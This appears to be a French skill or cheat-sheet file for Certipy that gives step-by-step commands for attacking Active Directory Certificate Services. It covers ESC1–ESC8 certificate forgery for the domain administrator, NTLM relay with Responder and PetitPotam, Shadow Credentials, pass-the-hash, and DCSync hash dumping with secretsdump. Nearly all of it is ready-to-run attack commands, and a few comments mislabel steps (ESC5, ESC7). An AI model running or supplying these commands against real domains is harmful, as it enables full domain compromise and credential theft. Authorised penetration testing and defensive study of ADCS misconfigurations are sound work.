---
name: certipy
description: Certipy — exploitation ADCS (Active Directory Certificate Services), ESC1 à ESC8, forger des certificats, authentification par certificat, pass-the-certificate, Shadow Credentials, et attaques PKI.
---

# Certipy — Exploitation ADCS (PKI)

## Présentation

Certipy est un outil Python pour l'exploitation des services de certificats Active Directory (ADCS). Il permet de détecter et exploiter les ESC (Escalation) 1 à 8.

**Installation :**
```bash
pip3 install certipy-ad

# Dernière version
git clone https://github.com/ly4k/Certipy.git
cd Certipy && pip3 install .
```

---

## Concepts ADCS

### ESC (Escalation) — Vulnérabilités ADCS
```bash
# ESC1  : Certificat avec SAN (Subject Alternative Name) modifiable
#        → Forger un certificat pour n'importe quel user (dont DA)
#
# ESC2  : Tous les usages (san) → même impact que ESC1
#
# ESC3  : Agent de récupération de certificats
#        → Demander un certificat pour n'importe quel user
#
# ESC4  : ACL vulnérables sur le template
#        → Modifier le template pour le rendre vulnérable (puis ESC1)
#
# ESC5  : ACL vulnérables sur l'CA (Certificate Authority)
#        → Modifier les paramètres de l'CA
#
# ESC6  : EDITF_ATTRIBUTESUBJECTALTNAME2 (CA param)
#        → Remplacer ESC1 (pas besoin de template particulier)
#
# ESC7  : Accès CA Manager + SubCA
#        → Approuver sa propre requête de certificat
#
# ESC8  : NTLM Relay vers ADCS Web Enrollment
#        → Voler un certificat (via HTTP Web Enrollment)
```

---

## Reconnaissance ADCS

### Découverte des services ADCS
```bash
# Trouver les CA (Certificate Authorities)
certipy find -u user@domain.local -p 'Password123' -dc-ip 192.168.1.10

# Sauvegarder dans un fichier
certipy find -u user@domain.local -p 'Password123' -dc-ip 192.168.1.10 \
    -stdout -output certipy_output

# Analyse détaillée
certipy find -u user@domain.local -p 'Password123' -dc-ip 192.168.1.10 \
    -vulnerable -stdout
```

### Analyse des résultats
```bash
# Le fichier de sortie liste :
#   1. Certificate Authorities
#   2. Certificate Templates
#   3. Vulnerabilities (ESC1-ESC8)

# Points clés :
# - CA avec EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)
# - Templates avec CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1)
# - Templates avec Application Policies (Any Purpose) (ESC2)
# - Templates avec Certificate Request Agent (ESC3)
# - ACLs modifiables sur templates (ESC4)
# - ACLs modifiables sur CA (ESC5, ESC6, ESC7)
```

### Détection ESC1
```bash
certipy find -u user@domain.local -p 'Password123' -dc-ip 192.168.1.10 \
    | grep -A 10 "ESC1"

# Ce qu'on cherche dans le template :
#   - Enabled : True
#   - Enrollee Supplies Subject : True
#   - Client Authentication : OID présent
#   - Manager Approval : False
#   - Authorized Signatures : 0
```

---

## Exploitation ESC1 (Basique)

### Condition : Template vulnérable (enrollee supplies subject)

```bash
# 1. Demander un certificat pour l'utilisateur DA
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'VulnTemplate' \
    -target 192.168.1.10 \
    -upn 'administrator@domain.local'

# Fichiers créés :
#   administrator_dc.pfx       # Certificat PFX (avec clé privée)
#   administrator.crt          # Certificat public
#   administrator.key          # Clé privée
```

### 2. Authentification avec le certificat
```bash
# Obtenir le TGT
certipy auth -pfx administrator_dc.pfx \
    -dc-ip 192.168.1.10 \
    -username administrator \
    -domain domain.local

# Récupère le hash NTLM de l'utilisateur cible
# Sortie : administrator@domain.local NTHASH
```

### 3. Pass-the-Hash avec le hash récupéré
```bash
evil-winrm -i 192.168.1.10 -u Administrator -H <NTHASH>
impacket-psexec -hashes :<NTHASH> Administrator@192.168.1.10
```

### 4. OU : obtenir un TGT et l'utiliser
```bash
# Convertir le PFX en CCACHE
certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.1.10
export KRB5CCNAME=/path/to/administrator.ccache

# Maintenant on peut utiliser n'importe quel outil
impacket-psexec -k -no-pass administrator@192.168.1.10
```

---

## Exploitation ESC2 (Any Purpose)

### ESC2 — Tous les usages autorisés
```bash
# 1. Trouver un template avec "Any Purpose" / "All" en Extended Key Usage
certipy find -u user@domain.local -p 'Password123' | grep -A 5 "ESC2"

# 2. Demander un certificat
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'AnyPurposeTemplate' \
    -target 192.168.1.10

# 3. Utiliser le certificat
certipy auth -pfx certificate.pfx -dc-ip 192.168.1.10
```

---

## Exploitation ESC3 (Certificate Request Agent)

### ESC3 — Agent de récupération
```bash
# 1. S'inscrire au template "Certificate Request Agent" (OID 1.3.6.1.4.1.311.20.2.1)
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'User' \
    -target 192.168.1.10

# 2. Demander un certificat POUR un autre utilisateur
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'Machine/User' \
    -target 192.168.1.10 \
    -on-behalf-of 'DOMAIN\Administrator'
```

---

## Exploitation ESC4 (ACL Abuse)

### ESC4 — Modifier un template pour le rendre vulnérable
```bash
# 1. Trouver un template où l'utilisateur a des droits d'écriture
certipy find -u user@domain.local -p 'Password123' \
    -dc-ip 192.168.1.10 | grep -A 10 "ESC4"

# 2. Modifier le template (ajouter Enrollee Supplies Subject)
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnTemplate' \
    -save-old \
    -dc-ip 192.168.1.10

# 3. Maintenant ESC1 est possible sur ce template
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'VulnTemplate' \
    -target 192.168.1.10 \
    -upn 'administrator@domain.local'

# 4. Restaurer le template (optionnel)
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnTemplate' \
    -configuration 'old.json'
```

---

## Exploitation ESC5 (CA ACL Abuse)

```bash
# 1. Vérifier les droits sur l'CA
certipy find -u user@domain.local -p 'Password123' | grep -A 10 "ESC5"

# 2. Si l'utilisateur a ManageCA et/ou ManageCertificates → plein accès
# Ajouter un template vulnérable
certipy ca -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -add-officer 'attacker' \
    -target 192.168.1.10
```

---

## Exploitation ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

```bash
# 1. Détecter ESC6
certipy find -u user@domain.local -p 'Password123' | grep -A 10 "ESC6"

# 2. Demander n'importe quel template (même User)
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'User' \
    -target 192.168.1.10 \
    -upn 'administrator@domain.local'
```

---

## Exploitation ESC7 (CA Manager + SubCA)

```bash
# 1. Vérifier si ManageCA + ManageCertificates
certipy find -u user@domain.local -p 'Password123' | grep -A 10 "ESC7"

# 2. Si ManageCA mais PAS ManageCertificates :
#    → Permettre à l'utilisateur d'approuver ses requêtes
certipy ca -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -enable 'EDITF_ATTRIBUTESUBJECTALTNAME2' \
    -target 192.168.1.10

# 3. Demander un certificat (avec -approved)
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'SubCA' \
    -target 192.168.1.10 \
    -upn 'administrator@domain.local' \
    -approved
```

---

## Exploitation ESC8 (NTLM Relay to ADCS)

### Préparation : NTLM Relay vers Web Enrollment
```bash
# 1. Démarrer ntlmrelayx pour relayer vers l'ADCS Web Enrollment
impacket-ntlmrelayx -t http://192.168.1.10/certsrv/certfnsh.asp \
    -smb2support \
    --adcs \
    --template 'User'

# 2. Démarrer Responder SANS SMB pour capturer les hashes
sudo responder -I eth0 -r -d -w -v

# 3. Attendre qu'un admin ou une machine s'authentifie
#    → ntlmrelayx relay le hash vers ADCS
#    → Obtient un certificat pour l'utilisateur cible
```

### Récupération automatique avec Certipy
```bash
# 1. Démarrer Certipy en mode écoute
certipy relay -ca 'CA-SERVER-CA' -template 'User'

# 2. Dans un autre terminal : forcer une authentification
#    via PetitPotam ou PrinterBug
python3 petitpotam.py -u '' -p '' 192.168.1.50 192.168.1.10
```

---

## Shadow Credentials

```bash
# Condition : user a GenericAll ou GenericWrite sur une machine

# 1. Ajouter Key Credentials (Shadow Credentials)
certipy shadow add -u user@domain.local -p 'Password123' \
    -target 'DC01$' \
    -dc-ip 192.168.1.10

# 2. Authentifier avec le Device Certificate
certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10 \
    -username 'DC01$' -domain domain.local

# 3. Maintenant DCSync possible avec le hash de la machine
impacket-secretsdump -hashes :<NTHASH> 'DOMAIN/DC01$@192.168.1.10'

# 4. Nettoyer (supprimer les Key Credentials)
certipy shadow remove -u user@domain.local -p 'Password123' \
    -target 'DC01$'
```

---

## Création de certificats

### Demande de certificat basique
```bash
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'User' \
    -target 192.168.1.10 \
    -key-size 2048
```

### Certificat avec clé exportable
```bash
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'User' \
    -target 192.168.1.10 \
    -key-export
```

---

## Authentification avec certificat

### Obtenir TGT + Hash
```bash
certipy auth -pfx certificate.pfx \
    -dc-ip 192.168.1.10 \
    -username administrator \
    -domain domain.local
```

### Utilisation dans Kerberos
```bash
# Exporter en CCACHE
certipy auth -pfx certificate.pfx \
    -dc-ip 192.168.1.10 \
    -export

# Utiliser le ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@192.168.1.10
```

---

## Scénarios complets

### 1. Dump du domaine via PKI
```bash
# 1. Découverte ADCS
certipy find -u user@domain.local -p 'Password123' -dc-ip 192.168.1.10

# 2. Exploiter ESC1
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'ESC1Template' \
    -target 192.168.1.10 \
    -upn 'administrator@domain.local'

# 3. Auth et hash
certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.1.10

# 4. DCSync
impacket-secretsdump -hashes :<NTHASH> 'DOMAIN/Administrator@192.168.1.10'
```

### 2. ESC8 + Relay
```bash
# Terminal 1 : Certipy relay
certipy relay -ca 'CA-SERVER-CA' -template 'User'

# Terminal 2 : Forcer auth
petitpotam.py -u '' -p '' 192.168.1.50 192.168.1.10

# Terminal 3 : Récupérer le hash
certipy auth -pfx <cert>.pfx -dc-ip 192.168.1.10
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| "No CA found" | Vérifier ADCS installé sur le DC |
| "Access denied" | L'utilisateur n'a pas les droits d'enrôlement |
| ESC1 pas exploitable | Vérifier que le template est activé et accessible |
| PFX corrompu | Re-générer avec --key-export |
| "Certificate failed" | Vérifier l'URL ADCS (http://dc/certsrv/) |

---

## Antisèche rapide

```bash
# 1. Découverte
certipy find -u user@domain.local -p 'Password123' -dc-ip 192.168.1.10

# 2. ESC1 — Demander certificat pour admin
certipy req -u user@domain.local -p 'Password123' \
    -ca 'CA-SERVER-CA' \
    -template 'VulnTemplate' \
    -target 192.168.1.10 \
    -upn 'administrator@domain.local'

# 3. Authentification + Hash
certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.1.10

# 4. DCSync
impacket-secretsdump -hashes :NTHASH 'DOMAIN/Admin@192.168.1.10'

# Shadow Credentials
certipy shadow add -u user@domain.local -p 'Password123' \
    -target 'DC01$' -dc-ip 192.168.1.10
```